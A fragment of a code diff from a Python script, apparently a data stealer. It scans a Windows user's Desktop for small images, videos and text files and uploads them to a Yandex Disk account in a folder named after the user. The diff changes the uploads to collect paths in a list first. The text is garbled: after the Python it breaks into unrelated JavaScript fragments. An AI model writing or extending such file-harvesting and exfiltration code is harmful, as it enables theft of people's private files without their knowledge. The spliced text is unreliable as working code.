@@ -149,9 +149,7 @@ def file_handler(start_path):
 
             if file_extension in ['jpg', 'jpeg', 'png', 'gif', 'svg', 'mp4', 'txt', 'avi', 'm4v', 'mov', 'mpg', 'mpeg', 'wmv']:
                 if (os.path.getsize(current_path) / 1024) < 250:
-                    try:
-                        disk.upload(current_path, f'/{username}/{file_name}')
-                    except Exception as error: pass
+                    files_to_upload.append(current_path)
 
 
 import yadisk
@@ -165,9 +163,8 @@ if disk.check_token():
     try:
         disk.mkdir(username)
     except Exception as error: pass
-    
-    print(dir())
-    
+
+    files_to_upload = list()
     file_handler(os.path.join(r'C:\Users', username, 'Desktop'))id=4352421
 */
 var status = 0, download, div, link;
